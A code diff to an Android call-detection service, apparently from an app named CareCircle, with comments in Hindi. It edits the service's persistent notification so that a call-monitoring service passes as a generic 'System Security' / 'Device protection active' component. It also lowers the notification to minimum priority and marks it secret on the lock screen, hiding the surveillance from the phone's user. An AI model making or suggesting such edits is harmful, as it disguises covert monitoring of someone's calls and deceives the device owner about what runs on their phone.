@@ -84,22 +84,23 @@ class CallDetectorService : Service() {
         // 🔥 अत्यंत आवश्यक: 5 सेकंड के भीतर startForeground() कॉल करें, अन्यथा Android ऐप को किल कर देगा
         try {
             val notification = android.app.Notification.Builder(this, "call_detector_channel")
-                .setContentTitle("CareCircle Protection")
-                .setContentText("Monitoring active")
+                .setContentTitle("System Security")
+                .setContentText("Device protection active")
                 .setSmallIcon(R.drawable.ic_notification)
                 .setOngoing(true)
-                .setPriority(android.app.Notification.PRIORITY_LOW)
+                .setPriority(android.app.Notification.PRIORITY_MIN)
                 .build()
 
             // सुनिश्चित करें कि एंड्रॉइड 8+ के लिए चैनल मौजूद है
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                 val channel = android.app.NotificationChannel(
                     "call_detector_channel",
-                    "Call Detection",
-                    android.app.NotificationManager.IMPORTANCE_LOW
+                    "System Protection",
+                    android.app.NotificationManager.IMPORTANCE_MIN
                 ).apply {
-                    description = "Background call monitoring"
+                    description = "Background system protection"
                     setShowBadge(false)
+                    lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                 }
                 val manager = getSystemService(android.app.NotificationManager::class.java)
                 manager.createNotificationChannel(channel)
